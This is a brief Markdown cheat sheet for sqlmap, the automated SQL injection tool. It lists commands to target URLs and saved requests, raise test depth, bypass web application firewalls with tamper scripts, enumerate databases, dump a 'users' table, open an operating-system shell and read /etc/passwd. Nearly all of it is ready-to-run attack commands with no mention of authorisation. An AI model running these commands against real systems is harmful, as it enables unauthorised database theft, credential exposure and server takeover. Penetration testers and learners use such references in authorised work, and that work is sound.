# sqlmap — automated SQL injection

## Targets
sqlmap -u "https://target/item?id=1"
sqlmap -u "https://target/item?id=1" --batch      # non-interactive
sqlmap -r request.txt                             # from a saved HTTP request
sqlmap -u URL --data="user=1&pass=2"              # POST body
sqlmap -u URL --cookie="SESSION=abc"

## Tuning
sqlmap -u URL --level=5 --risk=3                   # deeper tests
sqlmap -u URL -p id                                # test only param id
sqlmap -u URL --dbms=mysql
sqlmap -u URL --technique=BEUSTQ                   # which techniques
sqlmap -u URL --tamper=space2comment               # WAF bypass

## Enumeration
sqlmap -u URL --dbs                                # list databases
sqlmap -u URL -D shop --tables
sqlmap -u URL -D shop -T users --columns
sqlmap -u URL -D shop -T users --dump
sqlmap -u URL --current-user --current-db --is-dba

## Shells / files
sqlmap -u URL --os-shell
sqlmap -u URL --file-read=/etc/passwd
sqlmap -u URL --sql-query="SELECT version()"
